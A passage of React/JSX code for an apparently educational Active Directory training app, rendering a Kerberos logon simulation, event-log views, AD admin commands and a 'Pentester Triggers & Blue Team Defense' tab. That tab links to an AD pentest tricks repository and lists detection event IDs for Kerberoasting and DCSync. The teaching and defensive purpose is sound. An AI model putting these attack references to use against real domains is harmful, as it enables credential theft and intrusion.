                  <span className="w-2 h-2 rounded-full bg-cyan-400 animate-ping" />
                ) : null}
              </div>
              <p className={`text-[11px] font-semibold truncate ${isActive ? 'text-white font-bold' : 'text-slate-300'}`}>
                {s.title.split('. ')[1]}
              </p>
            </button>
          );
        })}
      </div>

      {/* ============================================================ */}
      {/* INTERACTIVE NETWORK TOPOLOGY CANVAS */}
      {/* ============================================================ */}
      <div className="p-5 rounded-2xl bg-gradient-to-b from-slate-950 to-[#070b14] border border-slate-800 shadow-inner relative overflow-hidden">
        {/* Topology Background Grid Pattern */}
        <div className="absolute inset-0 bg-[radial-gradient(#1e293b_1px,transparent_1px)] [background-size:16px_16px] opacity-25 pointer-events-none" />

        {/* Nodes Grid */}
        <div className="relative z-10 grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          {/* Node 1: Workstation */}
          <div
            className={`p-4 rounded-xl border transition-all duration-300 ${
              currentSimStepData.activeNodeIds.includes('client')
                ? 'border-cyan-400 bg-slate-900/90 shadow-lg shadow-cyan-950/60 ring-2 ring-cyan-500/40'
                : 'border-slate-800/80 bg-slate-950/60 opacity-60'
            }`}
          >
            <div className="flex items-center justify-between mb-2">
              <div className="w-9 h-9 rounded-lg bg-cyan-950/80 border border-cyan-800 flex items-center justify-center text-cyan-400">
                <Laptop className="w-5 h-5" />
              </div>
              <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-slate-900 text-cyan-300 border border-slate-700">
                192.168.56.25
              </span>
            </div>
            <h4 className="font-bold text-xs text-white">WIN11-PC01</h4>
            <p className="text-[11px] text-slate-400 font-sans">Domain Workstation</p>
            <div className="mt-3 pt-2.5 border-t border-slate-800/80 text-[10px] font-mono space-y-1">
              <div className="text-slate-400 flex justify-between">
                <span>User:</span>
                <span className="text-cyan-300 font-bold">alice@corp.example</span>
              </div>
              <div className="text-slate-400 flex justify-between">
                <span>LSA State:</span>
                <span className="text-emerald-400">
                  {adSimStep === 1
                    ? 'Netlogon Initializing'
                    : adSimStep === 2
                    ? 'Encrypting Pre-Auth'
                    : adSimStep === 3
                    ? 'Sending AS-REQ'
                    : adSimStep === 4
                    ? 'Receiving TGT'
                    : adSimStep === 5
                    ? 'Token Created'
                    : 'Presenting TGS'}
                </span>
              </div>
            </div>
          </div>

          {/* Node 2: Internal DNS Server */}
          <div
            className={`p-4 rounded-xl border transition-all duration-300 ${
              currentSimStepData.activeNodeIds.includes('dns')
                ? 'border-indigo-400 bg-slate-900/90 shadow-lg shadow-indigo-950/60 ring-2 ring-indigo-500/40'
                : 'border-slate-800/80 bg-slate-950/60 opacity-60'
            }`}
          >
            <div className="flex items-center justify-between mb-2">
              <div className="w-9 h-9 rounded-lg bg-indigo-950/80 border border-indigo-800 flex items-center justify-center text-indigo-400">
                <Search className="w-5 h-5" />
              </div>
              <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-slate-900 text-indigo-300 border border-slate-700">
                192.168.56.1:53
              </span>
            </div>
            <h4 className="font-bold text-xs text-white">DNS01.corp.example</h4>
            <p className="text-[11px] text-slate-400 font-sans">Enterprise DNS Server</p>
            <div className="mt-3 pt-2.5 border-t border-slate-800/80 text-[10px] font-mono space-y-1">
              <div className="text-slate-400 flex justify-between">
                <span>Record:</span>
                <span className="text-indigo-300">_ldap._tcp.dc SRV</span>
              </div>
              <div className="text-slate-400 flex justify-between">
                <span>Status:</span>
                <span className={adSimStep === 3 ? 'text-indigo-400 font-bold animate-pulse' : 'text-slate-500'}>
                  {adSimStep === 3 ? 'Resolving DC01:389' : 'Standby'}
                </span>
              </div>
            </div>
          </div>

          {/* Node 3: Domain Controller */}
          <div
            className={`p-4 rounded-xl border transition-all duration-300 ${
              currentSimStepData.activeNodeIds.includes('dc')
                ? 'border-purple-400 bg-slate-900/90 shadow-lg shadow-purple-950/60 ring-2 ring-purple-500/40'
                : 'border-slate-800/80 bg-slate-950/60 opacity-60'
            }`}
          >
            <div className="flex items-center justify-between mb-2">
              <div className="w-9 h-9 rounded-lg bg-purple-950/80 border border-purple-800 flex items-center justify-center text-purple-400">
                <Server className="w-5 h-5" />
              </div>
              <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-slate-900 text-purple-300 border border-slate-700">
                192.168.56.10:88
              </span>
            </div>
            <h4 className="font-bold text-xs text-white">DC01.corp.example</h4>
            <p className="text-[11px] text-slate-400 font-sans">Primary Domain Controller</p>
            <div className="mt-3 pt-2.5 border-t border-slate-800/80 text-[10px] font-mono space-y-1">
              <div className="text-slate-400 flex justify-between">
                <span>AD Services:</span>
                <span className="text-purple-300">AD DS / KDC / LDAP</span>
              </div>
              <div className="text-slate-400 flex justify-between">
                <span>NTDS.dit:</span>
                <span className={adSimStep === 4 ? 'text-amber-400 font-bold animate-pulse' : 'text-slate-400'}>
                  {adSimStep === 1
                    ? 'Trust Checked'
                    : adSimStep === 4
                    ? 'Validating Hash & Mints TGT'
                    : adSimStep === 6
                    ? 'Issuing Service Ticket'
                    : 'Listening on Port 88'}
                </span>
              </div>
            </div>
          </div>

          {/* Node 4: Network File Server */}
          <div
            className={`p-4 rounded-xl border transition-all duration-300 ${
              currentSimStepData.activeNodeIds.includes('fs')
                ? 'border-emerald-400 bg-slate-900/90 shadow-lg shadow-emerald-950/60 ring-2 ring-emerald-500/40'
                : 'border-slate-800/80 bg-slate-950/60 opacity-60'
            }`}
          >
            <div className="flex items-center justify-between mb-2">
              <div className="w-9 h-9 rounded-lg bg-emerald-950/80 border border-emerald-800 flex items-center justify-center text-emerald-400">
                <HardDrive className="w-5 h-5" />
              </div>
              <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-slate-900 text-emerald-300 border border-slate-700">
                192.168.56.20:445
              </span>
            </div>
            <h4 className="font-bold text-xs text-white">FS01.corp.example</h4>
            <p className="text-[11px] text-slate-400 font-sans">File Server (SMB / CIFS)</p>
            <div className="mt-3 pt-2.5 border-t border-slate-800/80 text-[10px] font-mono space-y-1">
              <div className="text-slate-400 flex justify-between">
                <span>Shared Folder:</span>
                <span className="text-emerald-300">\\FS01\\Finance_Archive$</span>
              </div>
              <div className="text-slate-400 flex justify-between">
                <span>Access Status:</span>
                <span className={adSimStep === 6 ? 'text-emerald-400 font-bold animate-pulse' : 'text-slate-500'}>
                  {adSimStep === 6 ? 'NTFS Allow: Read/Write' : 'Standby'}
                </span>
              </div>
            </div>
          </div>
        </div>

        {/* Live Traffic Flight Path Bar */}
        <div className="mt-4 pt-3 border-t border-slate-800/80 flex flex-col sm:flex-row items-center justify-between gap-2 text-xs font-mono">
          <div className="flex items-center gap-2 text-slate-300">
            <span className="text-cyan-400 font-bold flex items-center gap-1">
              <Radio className="w-3.5 h-3.5 animate-pulse text-cyan-400" />
              ACTIVE WIRE TRAFFIC:
            </span>
            <span className="text-white font-semibold">{currentSimStepData.traffic.from}</span>
            <ArrowRight className="w-3.5 h-3.5 text-cyan-400" />
            <span className="text-white font-semibold">{currentSimStepData.traffic.to}</span>
          </div>

          <div className="flex items-center gap-2">
            <span className="px-2.5 py-0.5 rounded bg-slate-900 border border-slate-700 text-purple-300 font-bold text-[10px]">
              {currentSimStepData.traffic.proto}
            </span>
            <span className="px-2 py-0.5 rounded bg-black/60 border border-slate-800 text-slate-400 text-[10px]">
              {currentSimStepData.traffic.port}
            </span>
          </div>
        </div>
      </div>

      {/* ============================================================ */}
      {/* MULTI-PERSPECTIVE INSPECTOR (TRAINER / INTERNALS / PENTEST) */}
      {/* ============================================================ */}
      <div className="space-y-4">
        {/* Tab Switcher */}
        <div className="flex flex-wrap items-center justify-between gap-2 pb-2 border-b border-slate-800">
          <div className="flex items-center gap-1.5">
            <button
              onClick={() => setAdSimTab('trainer')}
              className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-bold transition cursor-pointer ${
                adSimTab === 'trainer'
                  ? 'bg-cyan-600 text-black shadow-md shadow-cyan-900/30'
                  : 'text-slate-400 hover:text-white hover:bg-slate-800'
              }`}
            >
              <Info className="w-3.5 h-3.5" />
              <span>Trainer Walkthrough</span>
            </button>

            <button
              onClick={() => setAdSimTab('internals')}
              className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-bold transition cursor-pointer ${
                adSimTab === 'internals'
                  ? 'bg-purple-600 text-white shadow-md shadow-purple-900/30'
                  : 'text-slate-400 hover:text-white hover:bg-slate-800'
              }`}
            >
              <Terminal className="w-3.5 h-3.5" />
              <span>Windows Internals & Event Logs</span>
            </button>

            <button
              onClick={() => setAdSimTab('pentest')}
              className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-bold transition cursor-pointer ${
                adSimTab === 'pentest'
                  ? 'bg-red-600 text-white shadow-md shadow-red-900/30'
                  : 'text-slate-400 hover:text-white hover:bg-slate-800'
              }`}
            >
              <ShieldAlert className="w-3.5 h-3.5" />
              <span>Pentester Triggers & Blue Team Defense</span>
            </button>
          </div>

          <button
            onClick={() => setShowWirePacket(!showWirePacket)}
            className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-mono transition cursor-pointer border ${
              showWirePacket
                ? 'bg-teal-950 border-teal-500 text-teal-300'
                : 'bg-slate-950 border-slate-800 text-slate-400 hover:text-white hover:border-slate-700'
            }`}
          >
            {showWirePacket ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
            <span>{showWirePacket ? 'Hide Packet Dissection' : 'Inspect Wire Packet'}</span>
          </button>
        </div>

        {/* TAB 1: TRAINER WALKTHROUGH */}
        {adSimTab === 'trainer' && (
          <div className="space-y-4 animate-fadeIn">
            {/* Trainer Exact Explanation Highlight */}
            <div className="p-4 rounded-xl bg-purple-950/30 border border-purple-800/50 shadow-lg">
              <span className="text-[10px] font-mono text-purple-400 uppercase tracking-widest font-bold block mb-1">
                TRAINER EXPLANATION (STEP {adSimStep} OF 6):
              </span>
              <p className="text-base sm:text-lg font-serif italic text-purple-100 font-semibold leading-relaxed">
                "{currentSimStepData.trainerQuote}"
              </p>
            </div>

            {/* Operational Deep Dive */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs font-mono">
              <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
                <span className="text-cyan-400 font-bold block uppercase">What is happening at this step:</span>
                <p className="text-slate-300 font-sans text-xs leading-relaxed">
                  {currentSimStepData.summary}
                </p>
                <div className="pt-2 border-t border-slate-800/80 space-y-1 text-[11px]">
                  <div className="text-slate-400">
                    <strong className="text-slate-200">Protocol & Ports:</strong> {currentSimStepData.traffic.proto} ({currentSimStepData.traffic.port})
                  </div>
                  <div className="text-slate-400">
                    <strong className="text-slate-200">Traffic Summary:</strong> {currentSimStepData.traffic.summary}
                  </div>
                </div>
              </div>

              <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
                <span className="text-emerald-400 font-bold block uppercase">Key Administrative Concept:</span>
                <p className="text-slate-300 font-sans text-xs leading-relaxed">
                  {currentSimStepData.internals.channel}
                </p>
                <div className="pt-2 border-t border-slate-800/80 text-[11px]">
                  <span className="text-slate-400">Target Identity Object:</span>
                  <p className="text-cyan-300 font-bold">{currentSimStepData.internals.account}</p>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* TAB 2: WINDOWS INTERNALS & EVENT LOGS */}
        {adSimTab === 'internals' && (
          <div className="space-y-4 animate-fadeIn">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs font-mono">
              {/* LSA Internal Subsystem Details */}
              <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
                <span className="text-purple-400 font-bold block uppercase flex items-center gap-1.5">
                  <Terminal className="w-4 h-4 text-purple-400" />
                  LSASS & Netlogon Operations:
                </span>
                <p className="text-slate-300 font-sans text-xs leading-relaxed">
                  {currentSimStepData.internals.lsaAction}
                </p>
                <div className="pt-3 border-t border-slate-800 space-y-1.5 text-[11px]">
                  <div className="flex justify-between p-1.5 rounded bg-slate-900 border border-slate-800">
                    <span className="text-slate-400">Identity Principal:</span>
                    <code className="text-cyan-300">{currentSimStepData.internals.account}</code>
                  </div>
                  <div className="flex justify-between p-1.5 rounded bg-slate-900 border border-slate-800">
                    <span className="text-slate-400">Security Context:</span>
                    <span className="text-emerald-300 font-sans">{currentSimStepData.internals.channel}</span>
                  </div>
                </div>
              </div>

              {/* Windows Event Viewer Card */}
              <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
                <div className="flex items-center justify-between pb-2 border-b border-slate-800">
                  <span className="text-amber-400 font-bold uppercase flex items-center gap-1.5">
                    <FileText className="w-4 h-4 text-amber-400" />
                    Windows Event Viewer (Security Log)
                  </span>
                  <span className="px-2 py-0.5 rounded bg-amber-950 border border-amber-800 text-amber-300 font-bold text-[10px]">
                    EVENT ID {currentSimStepData.internals.eventLog.id}
                  </span>
                </div>
                <div className="text-[11px] space-y-1 text-slate-400">
                  <div><strong className="text-slate-300">Log Name:</strong> Security</div>
                  <div><strong className="text-slate-300">Source:</strong> {currentSimStepData.internals.eventLog.source}</div>
                  <div><strong className="text-slate-300">Task Category:</strong> {currentSimStepData.internals.eventLog.task}</div>
                </div>
                <pre className="p-2.5 rounded bg-black/70 border border-slate-800/80 text-[11px] text-slate-300 overflow-x-auto whitespace-pre-wrap leading-relaxed">
                  {currentSimStepData.internals.eventLog.details}
                </pre>
              </div>
            </div>
          </div>
        )}

        {/* TAB 3: PENTESTING TRIGGERS & BLUE TEAM DEFENSE */}
        {adSimTab === 'pentest' && (
          <div className="space-y-4 animate-fadeIn">
            {/* Pentest Reference Callout Banner */}
            <div className="p-4 rounded-xl bg-red-950/30 border border-red-800/50 flex flex-col sm:flex-row sm:items-center justify-between gap-3 shadow-lg">
              <div>
                <span className="text-[10px] font-mono text-red-400 uppercase tracking-wider font-bold block mb-0.5">
                  RED TEAM PENTEST METHODOLOGY & TRIGGERS
                </span>
                <h4 className="text-sm font-bold text-red-100 flex items-center gap-2">
                  <ShieldAlert className="w-4 h-4 text-red-400" />
                  {currentSimStepData.pentest.attackTitle}
                </h4>
              </div>
              <a
                href="https://github.com/rodolfomarianocy/Tricks-Pentest-Active-Directory"
                target="_blank"
                rel="noreferrer"
                className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-red-900/60 border border-red-700 hover:border-red-400 text-red-200 text-xs font-mono transition shrink-0"
              >
                <span>rodolfomarianocy/Tricks-Pentest-Active-Directory</span>
                <ExternalLink className="w-3 h-3" />
              </a>
            </div>

            {/* Attack Details & Commands */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 text-xs font-mono">
              <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-3">
                <span className="text-red-400 font-bold block uppercase">Exploitation Concept:</span>
                <p className="text-slate-300 font-sans text-xs leading-relaxed">
                  {currentSimStepData.pentest.description}
                </p>
                <div className="pt-2 border-t border-slate-800">
                  <span className="text-slate-400 text-[10px] uppercase font-bold block mb-1.5">
                    Attacker Execution Triggers:
                  </span>
                  <div className="space-y-1.5">
                    {currentSimStepData.pentest.commands.map((cmd, idx) => (
                      <div
                        key={idx}
                        className="p-1.5 rounded bg-black/80 border border-slate-800/80 text-[11px] text-red-300 font-mono overflow-x-auto"
                      >
                        <code>{cmd}</code>
                      </div>
                    ))}
                  </div>
                </div>
              </div>

              <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-3">
                <span className="text-cyan-400 font-bold block uppercase flex items-center gap-1.5">
                  <ShieldCheck className="w-4 h-4 text-cyan-400" />
                  Blue Team Detection & Hardening:
                </span>
                <p className="text-slate-300 font-sans text-xs leading-relaxed">
                  {currentSimStepData.pentest.blueTeamDetection}
                </p>
                <div className="p-3 rounded-lg bg-slate-900/80 border border-slate-800 space-y-1.5 text-[11px]">
                  <strong className="text-cyan-300 block">Recommended Audit Event IDs:</strong>
                  <ul className="list-disc list-inside text-slate-400 space-y-1 font-sans">
                    <li><code className="text-purple-300 font-mono">4768</code> - Kerberos TGT Requests (Detect pre-auth disabled)</li>
                    <li><code className="text-purple-300 font-mono">4769</code> - Kerberos Service Ticket Requests (Kerberoasting)</li>
                    <li><code className="text-purple-300 font-mono">4624</code> - Successful Logons (Check logon types 2, 3, 5)</li>
                    <li><code className="text-purple-300 font-mono">4662</code> - Directory Service Access (Detect DCSync replication)</li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* WIRE PROTOCOL PACKET DISSECTION (TOGGLEABLE) */}
        {showWirePacket && (
          <div className="p-4 rounded-xl bg-black border border-teal-800/80 shadow-2xl text-xs font-mono space-y-3 animate-fadeIn">
            <div className="flex items-center justify-between pb-2 border-b border-teal-900">
              <span className="text-teal-400 font-bold uppercase flex items-center gap-1.5">
                <Cpu className="w-4 h-4 text-teal-400" />
                Wireshark Protocol Packet Dissection: {currentSimStepData.packet.type}
              </span>
              <span className="px-2 py-0.5 rounded bg-teal-950 text-teal-300 border border-teal-700 text-[10px]">
                {currentSimStepData.packet.protocol}
              </span>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-[11px] text-slate-400">
              <div><strong className="text-slate-200">Source:</strong> {currentSimStepData.packet.src}</div>
              <div><strong className="text-slate-200">Destination:</strong> {currentSimStepData.packet.dst}</div>
            </div>

            <div className="p-3 rounded-lg bg-slate-950 border border-teal-950/60 space-y-1.5">
              <span className="text-teal-300 font-bold text-[10px] block uppercase">Packet Header & Payload Attributes:</span>
              <div className="space-y-1 text-[11px]">
                {currentSimStepData.packet.fields.map((f, i) => (
                  <div key={i} className="flex justify-between py-1 border-b border-slate-900/60">
                    <span className="text-slate-400">{f.label}:</span>
                    <span className="text-teal-300 font-bold">{f.val}</span>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );

  return (
    <div className="space-y-6">
      {/* ============================================================ */}
      {/* TOP SUB-TOPIC NAVIGATION BAR */}
      {/* ============================================================ */}
      <div className="bg-slate-900 border border-slate-800 rounded-2xl p-2.5 shadow-xl">
        <div className="flex flex-wrap items-center justify-between gap-2">
          <div className="flex flex-wrap items-center gap-1.5">
            <button
              onClick={() => setActiveSection('ad-intro')}
              className={`flex items-center gap-2 px-3.5 py-2 rounded-xl font-bold text-xs transition cursor-pointer ${
                activeSection === 'ad-intro'
                  ? 'bg-purple-600 text-white shadow-lg shadow-purple-900/40 ring-1 ring-purple-400'
                  : 'text-slate-400 hover:text-white hover:bg-slate-800/60'
              }`}
            >
              <Database className="w-4 h-4 text-purple-300" />
              <span>1. Introduction to Active Directory</span>
            </button>

            <button
              onClick={() => setActiveSection('ad-sim')}
              className={`flex items-center gap-2 px-3.5 py-2 rounded-xl font-bold text-xs transition cursor-pointer ${
                activeSection === 'ad-sim'
                  ? 'bg-gradient-to-r from-cyan-600 to-purple-600 text-white shadow-lg shadow-cyan-900/40 ring-1 ring-cyan-400'
                  : 'text-slate-400 hover:text-white hover:bg-slate-800/60'
              }`}
            >
              <Activity className="w-4 h-4 text-cyan-300 animate-pulse" />
              <span>⚡ How AD Works (Simulation)</span>
            </button>

            <button
              onClick={() => setActiveSection('forests-dcs')}
              className={`flex items-center gap-2 px-3.5 py-2 rounded-xl font-bold text-xs transition cursor-pointer ${
                activeSection === 'forests-dcs'
                  ? 'bg-purple-600 text-white shadow-lg shadow-purple-900/40 ring-1 ring-purple-400'
                  : 'text-slate-400 hover:text-white hover:bg-slate-800/60'
              }`}
            >
              <Globe className="w-4 h-4 text-indigo-300" />
              <span>2. Domains, Forests & Domain Controllers</span>
            </button>

            <button
              onClick={() => setActiveSection('gpo')}
              className={`flex items-center gap-2 px-3.5 py-2 rounded-xl font-bold text-xs transition cursor-pointer ${
                activeSection === 'gpo'
                  ? 'bg-purple-600 text-white shadow-lg shadow-purple-900/40 ring-1 ring-purple-400'
                  : 'text-slate-400 hover:text-white hover:bg-slate-800/60'
              }`}
            >
              <Sliders className="w-4 h-4 text-emerald-300" />
              <span>3. Group Policy (GPO) Studio</span>
            </button>

            <button
              onClick={() => setActiveSection('auth')}
              className={`flex items-center gap-2 px-3.5 py-2 rounded-xl font-bold text-xs transition cursor-pointer ${
                activeSection === 'auth'
                  ? 'bg-purple-600 text-white shadow-lg shadow-purple-900/40 ring-1 ring-purple-400'
                  : 'text-slate-400 hover:text-white hover:bg-slate-800/60'
              }`}
            >
              <Key className="w-4 h-4 text-amber-300" />
              <span>4. Authentication Methods (Kerberos & NTLM)</span>
            </button>

            <button
              onClick={() => setActiveSection('scenario')}
              className={`flex items-center gap-2 px-3.5 py-2 rounded-xl font-bold text-xs transition cursor-pointer ${
                activeSection === 'scenario'
                  ? 'bg-purple-600 text-white shadow-lg shadow-purple-900/40 ring-1 ring-purple-400'
                  : 'text-slate-400 hover:text-white hover:bg-slate-800/60'
              }`}
            >
              <Award className="w-4 h-4 text-cyan-300" />
              <span>5. Practical Scenario: ABC Technologies</span>
            </button>
          </div>

          <span className="hidden xl:inline text-[10px] font-mono text-purple-300 bg-purple-950 px-2.5 py-1 rounded border border-purple-800 font-bold">
            TOPIC 12: WINDOWS SERVER & AD DS
          </span>
        </div>
      </div>

      {/* ============================================================ */}
      {/* SECTION 1: INTRODUCTION TO ACTIVE DIRECTORY */}
      {/* ============================================================ */}
      {activeSection === 'ad-intro' && (
        <div className="space-y-6 animate-fadeIn">
          {/* Header Banner */}
          <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-xl">
            <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-slate-800">
              <div className="flex items-center gap-3">
                <div className="w-12 h-12 rounded-xl bg-purple-950 border border-purple-500/50 flex items-center justify-center text-purple-400 shadow-inner">
                  <Database className="w-6 h-6" />
                </div>
                <div>
                  <h2 className="text-lg font-bold text-white flex items-center gap-2">
                    Introduction to Active Directory Domain Services (AD DS)
                  </h2>
                  <p className="text-xs text-slate-400">
                    Centralized directory architecture for managing users, computers, servers, security policies, and enterprise network access.
                  </p>
                </div>
              </div>

              <div className="flex items-center gap-2 text-xs font-mono">
                <span className="px-3 py-1 rounded bg-purple-950 text-purple-300 border border-purple-800">
                  SERVER 2019 / 2022
                </span>
                <span className="px-3 py-1 rounded bg-cyan-950 text-cyan-300 border border-cyan-800">
                  CENTRALIZED IDENTITY
                </span>
              </div>
            </div>

            {/* Practical Company Demonstration Example */}
            <div className="my-5 p-4 rounded-xl bg-purple-950/30 border border-purple-800/40 text-xs text-slate-300">
              <strong className="text-purple-300 font-mono block mb-1">
                Classroom Demonstration: Why Enterprises Need Active Directory
              </strong>
              <p className="leading-relaxed">
                Imagine an organization with <strong>100 employees</strong>, <strong>50 workstations</strong>, <strong>3 departments</strong> (HR, IT, Finance), and <strong>2 Windows Servers</strong>. Without Active Directory, an administrator would need to manually create and update 100 individual local accounts on every single computer (5,000 account operations!). With Active Directory, all accounts and policies are managed centrally on Domain Controllers, allowing users to seamlessly log in from any authorized domain workstation.
              </p>
            </div>

            {/* Core Components Grid */}
            <h3 className="text-xs font-mono uppercase text-slate-400 font-bold block mb-3">
              Core Active Directory Components:
            </h3>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3 text-xs font-mono">
              <div className="p-3.5 rounded-xl bg-slate-950 border border-slate-800">
                <span className="font-bold text-cyan-400 block mb-1">Users & Computers</span>
                <p className="text-slate-400 text-[11px] font-sans">
                  Represents individual employees and domain-joined client workstations / servers.
                </p>
              </div>
              <div className="p-3.5 rounded-xl bg-slate-950 border border-slate-800">
                <span className="font-bold text-emerald-400 block mb-1">Security Groups</span>
                <p className="text-slate-400 text-[11px] font-sans">
                  Organizes users into administrative units for assigning permissions across network resources.
                </p>
              </div>
              <div className="p-3.5 rounded-xl bg-slate-950 border border-slate-800">
                <span className="font-bold text-purple-400 block mb-1">Organizational Units (OU)</span>
                <p className="text-slate-400 text-[11px] font-sans">
                  Hierarchical folders inside a domain used to organize objects and link Group Policies.
                </p>
              </div>
              <div className="p-3.5 rounded-xl bg-slate-950 border border-slate-800">
                <span className="font-bold text-amber-400 block mb-1">Domain Controllers (DC)</span>
                <p className="text-slate-400 text-[11px] font-sans">
                  Servers hosting AD DS that validate credentials and store the directory database.
                </p>
              </div>
            </div>
          </div>

          {/* Embedded Full Interactive Lifecycle Simulation */}
          {renderAdLifecycleSimulation()}

          {/* Essential AD Admin Consoles & PowerShell */}
          <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-xl">
            <h3 className="text-xs font-mono uppercase text-slate-400 font-bold block mb-4">
              Active Directory Administrative Toolkit:
            </h3>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs font-mono">
              <div className="p-4 rounded-xl bg-slate-950 border border-slate-800">
                <span className="text-purple-300 font-bold block mb-2">GUI Management Consoles:</span>
                <div className="space-y-1.5 text-[11px] text-slate-300">
                  <div className="flex justify-between p-1.5 bg-slate-900 rounded border border-slate-800">
                    <span>Active Directory Users & Computers:</span>
                    <code className="text-cyan-400">dsa.msc</code>
                  </div>
                  <div className="flex justify-between p-1.5 bg-slate-900 rounded border border-slate-800">
                    <span>Group Policy Management:</span>
                    <code className="text-purple-400">gpmc.msc</code>
                  </div>
                  <div className="flex justify-between p-1.5 bg-slate-900 rounded border border-slate-800">
                    <span>Active Directory Domains & Trusts:</span>
                    <code className="text-emerald-400">domain.msc</code>
                  </div>
                  <div className="flex justify-between p-1.5 bg-slate-900 rounded border border-slate-800">
                    <span>Active Directory Sites & Services:</span>
                    <code className="text-amber-400">dssite.msc</code>
                  </div>
                </div>
              </div>

              <div className="p-4 rounded-xl bg-slate-950 border border-slate-800">
                <span className="text-cyan-300 font-bold block mb-2">PowerShell AD Commands:</span>
                <pre className="text-slate-300 text-[11px] bg-black/60 p-2.5 rounded overflow-x-auto leading-relaxed">
{`Import-Module ActiveDirectory

# Inspect Domain & Forest
Get-ADDomain
Get-ADForest

# Enumerate Domain Controllers
Get-ADDomainController -Filter *

# Enumerate Domain Users & Computers
Get-ADUser -Filter *
Get-ADComputer -Filter *`}
                </pre>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ============================================================ */}
      {/* SECTION: DEDICATED HOW ACTIVE DIRECTORY WORKS SIMULATION */}
      {/* ============================================================ */}
      {activeSection === 'ad-sim' && (
        <div className="space-y-6 animate-fadeIn">
          {renderAdLifecycleSimulation()}
        </div>
      )}

      {/* ============================================================ */}
      {/* SECTION 2: DOMAINS, FORESTS & DOMAIN CONTROLLERS */}
      {/* ============================================================ */}
      {activeSection === 'forests-dcs' && (
        <div className="space-y-6 animate-fadeIn">
          <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-xl">
            <div className="pb-4 border-b border-slate-800">
              <h2 className="text-base font-bold text-white flex items-center gap-2">
                <Globe className="w-5 h-5 text-indigo-400" />
                Domains, Forests and Domain Controllers
              </h2>
              <p className="text-xs text-slate-400 mt-0.5">
                The architectural building blocks of enterprise Active Directory identity infrastructure.
              </p>
            </div>

            {/* Tree Diagram Visualizer */}
            <div className="my-5 p-5 rounded-xl bg-slate-950 border border-slate-800">
              <span className="text-xs font-mono uppercase text-indigo-400 font-bold block mb-3 text-center">
                ENTERPRISE MULTI-DOMAIN FOREST TOPOLOGY
              </span>

              <div className="max-w-2xl mx-auto p-4 rounded-xl bg-slate-900 border border-indigo-500/50 text-xs font-mono shadow-lg">
                <div className="text-indigo-300 font-bold flex items-center justify-between pb-2 border-b border-slate-800">
                  <span>FOREST ROOT: company.example</span>
                  <span className="text-[10px] px-2 py-0.5 rounded bg-indigo-950 text-indigo-400">
                    Enterprise Root Security Boundary
                  </span>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-3 gap-3 mt-4 text-[11px]">
                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800">
                    <span className="text-cyan-400 font-bold block mb-1">india.company.example</span>
                    <p className="text-slate-400">Regional Child Domain</p>
                    <div className="mt-2 text-[10px] text-slate-500">Two-way transitive trust with Root</div>
                  </div>

                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800">
                    <span className="text-cyan-400 font-bold block mb-1">usa.company.example</span>
                    <p className="text-slate-400">Regional Child Domain</p>
                    <div className="mt-2 text-[10px] text-slate-500">Two-way transitive trust with Root</div>
                  </div>

                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800">
                    <span className="text-cyan-400 font-bold block mb-1">uk.company.example</span>
                    <p className="text-slate-400">Regional Child Domain</p>
                    <div className="mt-2 text-[10px] text-slate-500">Two-way transitive trust with Root</div>
                  </div>
                </div>
              </div>
            </div>

            {/* Matrix Definitions */}
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4 text-xs font-mono">
              <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
                <span className="text-cyan-400 font-bold block">1. What is a Domain?</span>
                <p className="text-slate-300 font-sans text-xs leading-relaxed">
                  A logical administrative structure containing users, computers, and groups sharing a common directory database. Security policies are scoped per domain.
                </p>
              </div>

              <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
                <span className="text-indigo-400 font-bold block">2. What is a Forest?</span>
                <p className="text-slate-300 font-sans text-xs leading-relaxed">
                  The highest-level security and administrative boundary. Contains one or more domain trees sharing a common Schema, Configuration, and Global Catalog.
                </p>
              </div>

              <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
                <span className="text-emerald-400 font-bold block">3. Domain Controller (DC)</span>
                <p className="text-slate-300 font-sans text-xs leading-relaxed">
                  A Windows Server hosting Active Directory Domain Services (AD DS). Validates logins, issues Kerberos tickets, enforces GPOs, and replicates changes.
                </p>
              </div>
            </div>

            {/* Interactive DC Discovery Console */}
            <div className="mt-6 pt-5 border-t border-slate-800">
              <div className="flex items-center justify-between mb-3">
